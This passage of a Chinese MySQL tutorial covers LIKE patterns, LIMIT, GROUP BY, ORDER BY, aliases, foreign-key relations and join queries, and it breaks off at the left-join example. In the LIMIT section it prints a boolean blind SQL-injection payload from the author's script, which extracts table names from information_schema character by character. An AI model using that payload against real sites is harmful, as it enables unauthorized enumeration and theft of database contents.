<p>在 MySQL 中， LIKE 运算符可以根据指定的模式过滤数据。LIKE 运算符一般用于模糊匹配字符数据。<code>LIKE</code> 运算符是一个双目比较运算符，需要两个操作数。 <code>LIKE</code> 运算符语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">expression <span class="keyword">LIKE</span> <span class="keyword">pattern</span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>expression 可以是一个字段名、值或其他的表达式（比如函数调用、运算等）。<br>
pattern 是一个字符串模式。MySQL 字符串模式支持两个通配符： % 和 _。</p>
<ul class="lvl-2">
<li class="lvl-4">% 匹配零或多个任意字符。</li>
<li class="lvl-5">_ 匹配单个任意字符。</li>
<li class="lvl-5">如果需要匹配通配符，则需要使用 \ 转义字符，如 % 和 _。</li>
<li class="lvl-5">使用通配符匹配文本时，不区分字母大小写。</li>
</ul>
</li>
<li class="lvl-2">
<p>如果 expression 与 pattern 匹配，LIKE 运算符返回 1，否则返回 0。</p>
</li>
</ul>
<p>常用：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>a%</code> 匹配以字符 a 开头的任意长度的字符串。</p>
</li>
<li class="lvl-2">
<p><code>%a</code> 匹配以字符 a 结尾的任意长度的字符串。</p>
</li>
<li class="lvl-2">
<p><code>%a%</code> 匹配包含字符 a 的任意长度的字符串。</p>
</li>
<li class="lvl-2">
<p><code>%a%b%</code> 匹配同时包含字符 a 和 b 且 a 在 b 前面的任意长度的字符串。</p>
</li>
<li class="lvl-2">
<p><code>a_</code> 匹配以字符 a 开头长度为 2 字符串。</p>
</li>
<li class="lvl-2">
<p><code>_a</code> 匹配以字符 a 结尾长度为 2 字符串。</p>
</li>
<li class="lvl-2">
<p>使用<code>NOT LIKE</code>进行否认查询</p>
</li>
</ul>
<ol>
<li class="lvl-4">
<p>普通字符串</p>
</li>
</ol>
<p>查询sname中与wang匹配的学生信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;wang&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>含有%通配的字符串</p>
</li>
</ol>
<p>%用于匹配任意长度的字符串。例如，字符串“a%”匹配以字符a开始任意长度的字符串</p>
<p>查询学生姓名以li开始的记录 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;li%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>查询学生姓名以g结尾的记录 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;%g&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>查询学生姓名包含s的记录 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;%s%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>含有_通配的字符串</p>
</li>
</ol>
<p>下划线通配符只匹配单个字符，如果要匹配多个字符，需要连续使用多个下划线通配符。例如，字符串“ab_”匹配以字符串“ab”开始长度为3的字符串，如abc、abp等等；字符串“a__d”匹配在字符“a”和“d”之间包含两个字符的字符串，如&quot;abcd&quot;、&quot;atud&quot;等等。</p>
<p>查询学生姓名以zx开头且长度为4的记录 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;zx__&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>查询学生姓名以g结尾且长度为4的记录 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;___g&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="使用LIMIT限制查询结果的数量">使用LIMIT限制查询结果的数量</h3>
<p>当执行查询数据时可能会返回很多条记录，而用户需要的数据可能只是其中的一条或者几条。比如在进行bool盲注入对数据库的所有表名进行爆破的时候，需要单独提取每一个表名分别进行爆破。语句如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name limit [<span class="keyword">offset</span>，] <span class="keyword">rows</span></span><br></pre></td></tr></table></figure>
<p>参数说明：<br>
<strong>offset：指定第一个返回记录行的偏移量（即从哪一行开始返回），注意：初始行的偏移量为0。<br>
rows：返回具体行数。</strong></p>
<p><strong>总结：如果limit后面是一个参数，就是检索前多少行。如果limit后面是2个参数，就是从offset+1行开始，检索rows行记录。</strong></p>
<p>举例：</p>
<p>查询学生表中年纪最小的3位同学 MySQL命令：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">asc</span> <span class="keyword">limit</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>我写的某个Python脚本中表名盲注SQL爆破时的判断语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;ascii(substr((select table_name from information_schema.tables limit &#123;index&#125;,1),&#123;i&#125;,1)) &gt; &#123;mid&#125;--+</span></span><br></pre></td></tr></table></figure>
<h3 id="使用GROUP-BY进行分组查询">使用GROUP BY进行分组查询</h3>
<p>GROUP BY 子句可像切蛋糕一样将表中的数据进行分组，再进行查询等操作。换言之，可通俗地理解为：通过GROUP BY将原来的表拆分成了几张小表。</p>
<p>接下来，我们通过一个例子开始学习GROUP BY，代码如下</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> mydb;</span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建员工表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employee (</span><br><span class="line">    id <span class="type">int</span>,</span><br><span class="line">    <span class="type">name</span> <span class="type">varchar</span>(<span class="number">50</span>),</span><br><span class="line">    salary <span class="type">int</span>,</span><br><span class="line">    departmentnumber <span class="type">int</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向员工表中插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;tome&#x27;</span>,<span class="number">2000</span>,<span class="number">1001</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">9000</span>,<span class="number">1002</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">&#x27;joke&#x27;</span>,<span class="number">5000</span>,<span class="number">1003</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">4</span>,<span class="string">&#x27;wang&#x27;</span>,<span class="number">3000</span>,<span class="number">1004</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">5</span>,<span class="string">&#x27;chen&#x27;</span>,<span class="number">3000</span>,<span class="number">1001</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">6</span>,<span class="string">&#x27;yukt&#x27;</span>,<span class="number">7000</span>,<span class="number">1002</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">7</span>,<span class="string">&#x27;rett&#x27;</span>,<span class="number">6000</span>,<span class="number">1003</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">8</span>,<span class="string">&#x27;mujk&#x27;</span>,<span class="number">4000</span>,<span class="number">1004</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">9</span>,<span class="string">&#x27;poik&#x27;</span>,<span class="number">3000</span>,<span class="number">1001</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>GROUP BY和聚合函数一起使用</p>
</li>
</ol>
<p>统计各部门员工个数 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*), departmentnumber <span class="keyword">from</span> employee <span class="keyword">group</span> <span class="keyword">by</span> departmentnumber;</span><br></pre></td></tr></table></figure>
<p>统计部门编号大于1001的各部门员工个数 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*), departmentnumber <span class="keyword">from</span> employee <span class="keyword">where</span> departmentnumber&gt;<span class="number">1001</span> <span class="keyword">group</span> <span class="keyword">by</span> departmentnumber;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>GROUP BY和聚合函数HAVING一起使用</p>
</li>
</ol>
<p>统计工资总和大于8000的部门 MySQL命令：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(salary),departmentnumber <span class="keyword">from</span> employee <span class="keyword">group</span> <span class="keyword">by</span> departmentnumber <span class="keyword">having</span> <span class="built_in">sum</span>(salary)&gt;<span class="number">8000</span>;</span><br></pre></td></tr></table></figure>
<h3 id="使用ORDER-BY对查询结果排序">使用ORDER BY对查询结果排序</h3>
<p>从表中査询出来的数据可能是无序的或者其排列顺序不是我们期望的。为此，我们可以使用ORDER BY对查询结果进行排序。其语法格式如下所示：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段名<span class="number">1</span>,字段名<span class="number">2</span>,…</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> 字段名<span class="number">1</span> [<span class="keyword">ASC</span> 丨 <span class="keyword">DESC</span>],字段名<span class="number">2</span> [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>];</span><br></pre></td></tr></table></figure>
<p>在该语法中：字段名1、字段名2是查询结果排序的依据；参数 ASC表示按照升序排序，DESC表示按照降序排序；默认情况下，按照ASC方式排序。通常情况下，ORDER BY子句位于整个SELECT语句的末尾。</p>
<p>查询所有学生并按照年纪大小升序排列 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">asc</span>;</span><br></pre></td></tr></table></figure>
<p>查询所有学生并按照年纪大小降序排列 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure>
<h2 id="别名设置">别名设置</h2>
<p>在査询数据时可为表和字段取別名，该别名代替表和字段的原名参与查询操作。</p>
<ol>
<li class="lvl-3">
<p>为表取名</p>
</li>
</ol>
<p>在查询操作时，假若表名很长使用起来就不太方便，此时可为表取一个別名，用该别名来代替表的名称。语法格式如下所示：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表名 [<span class="keyword">AS</span>] 表的别名 <span class="keyword">WHERE</span> .... ;</span><br></pre></td></tr></table></figure>
<p>将student改为stu查询整表 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">as</span> stu;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>为字段取名</p>
</li>
</ol>
<p>在查询操作时，假若字段名很长使用起来就不太方便，此时可该字段取一个別名，用该别名来代替字段的名称。语法格式如下所示：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段名<span class="number">1</span> [<span class="keyword">AS</span>] 别名<span class="number">1</span> , 字段名<span class="number">2</span> [<span class="keyword">AS</span>] 别名<span class="number">2</span> , ... <span class="keyword">FROM</span> 表名 <span class="keyword">WHERE</span> ... ;</span><br></pre></td></tr></table></figure>
<p>将student中的name取别名为“姓名” 查询整表 MySQL命令：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">name</span> <span class="keyword">as</span> <span class="string">&#x27;姓名&#x27;</span>,id <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<h2 id="表的关联关系">表的关联关系</h2>
<p>在实际开发中数据表之间存在着各种关联关系。在此，介绍MySQL中数据表的三种关联关系。多对一多对一(亦称为一对多)是数据表中最常见的一种关系。例如：员工与部门之间的关系，一个部门可以有多个员工；而一个员工不能属于多个部门只属于某个部门。在多对一的表关系 中，应将外键建在多的一方否则会造成数据的冗余。多对多多对多是数据表中常见的一种关系。例如：学生与老师之间的关系，一个学生可以有多个老师而且一个老师有多个学生。通常情况下，为了实现这种关系需要定义一张中间表(亦称为连接表)该表会存在两个外键分别参照老师表和学生表。一对一在开发过程中，一对一的关联关系在数据库中并不常见；因为以这种方式存储的信息通常会放在同一张表中。接下来，我们来学习在一对多的关联关系中如果添加和删除数据。先准备一些测试数据，代码如下：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> student;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="keyword">class</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建班级表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">class</span>(</span><br><span class="line">    cid <span class="type">int</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    cname <span class="type">varchar</span>(<span class="number">30</span>) </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建学生表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student(</span><br><span class="line">    sid <span class="type">int</span>(<span class="number">8</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    sname <span class="type">varchar</span>(<span class="number">30</span>),</span><br><span class="line">    classid <span class="type">int</span>(<span class="number">8</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 为学生表添加外键约束</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_student_classid <span class="keyword">FOREIGN KEY</span>(classid) <span class="keyword">REFERENCES</span> <span class="keyword">class</span>(cid);</span><br><span class="line"><span class="comment">-- 向班级表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span>(cid,cname)<span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;Java&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span>(cid,cname)<span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;Python&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向学生表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;tome&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;lili&#x27;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;domi&#x27;</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>关联查询</p>
</li>
</ol>
<p>查询Java班的所有学生 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> classid=(<span class="keyword">select</span> cid <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">where</span> cname=<span class="string">&#x27;Java&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>关于关联关系的数据删除</p>
</li>
</ol>
<p>请从班级表中删除Java班级。在此，请注意：班级表和学生表之间存在关联关系；要删除Java班级，应该先删除学生表中与该班相关联的学生。否则，假若先删除Java班那么学生表中的cid就失去了关联</p>
<p>删除Java班 MySQL命令：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> from student where classid=(<span class="keyword">select</span> cid from <span class="class"><span class="keyword">class</span> <span class="title">where</span> <span class="title">cname</span>=&#x27;<span class="title">Java</span>&#x27;)</span>;</span><br><span class="line"><span class="keyword">delete</span> from <span class="class"><span class="keyword">class</span> <span class="title">where</span> <span class="title">cname</span>=&#x27;<span class="title">Java</span>&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="多表连接查询">多表连接查询</h2>
<h3 id="交叉连接查询">交叉连接查询</h3>
<p>交叉连接返回的结果是被连接的两个表中所有数据行的笛卡儿积；比如：集合A={a,b}，集合B={0,1,2}，则集合A和B的笛卡尔积为{(a,0),(a,1),(a,2),(b,0),(b,1),(b,2)}。所以，交叉连接也被称为笛卡尔连接，其语法格式如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表<span class="number">1</span> <span class="keyword">CROSS</span> <span class="keyword">JOIN</span> 表<span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<p><font class="notice">注：在该语法中，CROSS JOIN用于连接两个要查询的表，通过该语句可以查询两个表中所有的数据组合。</font></p>
<p><strong>由于这个交叉连接查询在实际运用中没有任何意义，所以只做为了解即可</strong></p>
<h3 id="内链接查询">内链接查询</h3>
<p>内连接(Inner Join)又称简单连接或自然连接，是一种非常常见的连接查询。内连接使用比较运算符对两个表中的数据进行比较并列出与连接条件匹配的数据行，组合成新的 记录。也就是说在内连接查询中只有满足条件的记录才能出现在查询结果中。其语法格式如下：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 查询字段<span class="number">1</span>,查询字段<span class="number">2</span>, ... <span class="keyword">FROM</span> 表<span class="number">1</span> [<span class="keyword">INNER</span>] <span class="keyword">JOIN</span> 表<span class="number">2</span> <span class="keyword">ON</span> 表<span class="number">1.</span>关系字段=表<span class="number">2.</span>关系字段</span><br></pre></td></tr></table></figure>
<p>在该语法中：INNER JOIN用于连接两个表，ON来指定连接条件；其中INNER可以省略。</p>
<p>准备数据，代码如下：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 若存在数据库mydb则删除</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="comment">-- 创建数据库mydb</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> mydb;</span><br><span class="line"><span class="comment">-- 选择数据库mydb</span></span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建部门表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> department(</span><br><span class="line">  did <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  dname <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建员工表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employee (</span><br><span class="line">  eid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  ename <span class="type">varchar</span> (<span class="number">20</span>), </span><br><span class="line">  eage <span class="type">int</span> (<span class="number">2</span>), </span><br><span class="line">  departmentid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向部门表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1001</span>,<span class="string">&#x27;财务部&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1002</span>,<span class="string">&#x27;技术部&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1003</span>,<span class="string">&#x27;行政部&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1004</span>,<span class="string">&#x27;生活部&#x27;</span>);</span><br><span class="line"><span class="comment">-- 向员工表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;张三&#x27;</span>,<span class="number">19</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="number">18</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;王五&#x27;</span>,<span class="number">20</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;赵六&#x27;</span>,<span class="number">20</span>,<span class="number">1004</span>);</span><br></pre></td></tr></table></figure>
<p>查询员工姓名及其所属部门名称 MySQL命令：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> employee.ename,department.dname <span class="keyword">from</span> department <span class="keyword">inner</span> <span class="keyword">join</span> employee <span class="keyword">on</span> department.did=employee.departmentid;</span><br></pre></td></tr></table></figure>
<h3 id="外连接查询">外连接查询</h3>
<p>在使用内连接查询时我们发现：返回的结果只包含符合查询条件和连接条件的数据。但是，有时还需要在返回查询结果中不仅包含符合条件的数据，而且还包括左表、右表或两个表中的所有数据，此时我们就需要使用外连接查询。外连接又分为左(外)连接和右(外)连接。其语法格式如下：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 查询字段<span class="number">1</span>,查询字段<span class="number">2</span>, ... <span class="keyword">FROM</span> 表<span class="number">1</span> <span class="keyword">LEFT</span> | <span class="keyword">RIGHT</span> [<span class="keyword">OUTER</span>] <span class="keyword">JOIN</span> 表<span class="number">2</span> <span class="keyword">ON</span> 表<span class="number">1.</span>关系字段=表<span class="number">2.</span>关系字段 <span class="keyword">WHERE</span> 条件</span><br></pre></td></tr></table></figure>
<p>由此可见，外连接的语法格式和内连接非常相似，只不过使用的是LEFT [OUTER] JOIN、RIGHT [OUTER] JOIN关键字。其中，关键字左边的表被称为左表，关键字右边的表被称为右表；OUTER可以省略。</p>
<p>在使用左(外)连接和右(外)连接查询时，查询结果是不一致的，具体如下：</p>
<p><strong>1、LEFT [OUTER] JOIN 左(外)连接：返回包括左表中的所有记录和右表中符合连接条件的记录。<br>
2、RIGHT [OUTER] JOIN 右(外)连接：返回包括右表中的所有记录和左表中符合连接条件的记录。</strong></p>
<p>先准备数据，代码如下：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 若存在数据库mydb则删除</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="comment">-- 创建数据库mydb</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> mydb;</span><br><span class="line"><span class="comment">-- 选择数据库mydb</span></span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建班级表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">class</span>(</span><br><span class="line">  cid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  cname <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建学生表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">  sid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  sname <span class="type">varchar</span> (<span class="number">20</span>), </span><br><span class="line">  sage <span class="type">int</span> (<span class="number">2</span>), </span><br><span class="line">  classid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">-- 向班级表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1001</span>,<span class="string">&#x27;Java&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1002</span>,<span class="string">&#x27;C++&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1003</span>,<span class="string">&#x27;Python&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1004</span>,<span class="string">&#x27;PHP&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向学生表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;张三&#x27;</span>,<span class="number">20</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="number">21</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;王五&#x27;</span>,<span class="number">24</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;赵六&#x27;</span>,<span class="number">23</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">&#x27;Jack&#x27;</span>,<span class="number">22</span>,<span class="number">1009</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>左（外）连接查询</p>
</li>
</ol>
<p>左(外)连接的结果包括LEFT JOIN子句中指定的左表的所有记录，以及所有满足连接条件的记录。如果左表的某条记录在右表中不存在则在右表中显示为空。</p>
<p>查询每个班的班级ID、班级名称及该班的所有学生的名字 MySQL命令：</p>
